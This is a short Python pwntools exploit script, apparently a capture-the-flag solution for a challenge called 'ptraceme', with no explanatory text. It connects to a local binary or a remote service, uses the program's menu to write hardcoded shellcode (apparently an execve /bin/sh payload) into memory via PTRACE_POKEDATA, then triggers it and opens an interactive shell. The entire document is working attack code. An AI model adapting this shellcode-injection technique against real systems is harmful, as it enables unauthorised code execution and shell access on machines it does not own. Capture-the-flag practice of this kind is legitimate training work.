#!/usr/bin/env python3
from pwn import * 

context.log_level = 'DEBUG'
elf = ELF('./ptraceme')
PTRACE_POKEDATA = 5
PTRACE_POKETEXT = 7 

if args['REMTOE']:
    io = remote('pwnable.co.il',9014)
else: 
    io = process([elf.path])    


shellcode = [0x31C050682F2F7368,0x682F62696E89E350, 0x5389E1B00BCD8090]

injecting_address = 0x040136a

for code in shellcode: 
    io.sendline(b'1')

    io.sendline(str(PTRACE_POKEDATA).encode())

    io.sendline(str(injecting_address).encode())

    io.sendline(str(code).encode())


    
    injecting_address += 8
    
io.sendline(b'2')
io.interactive()


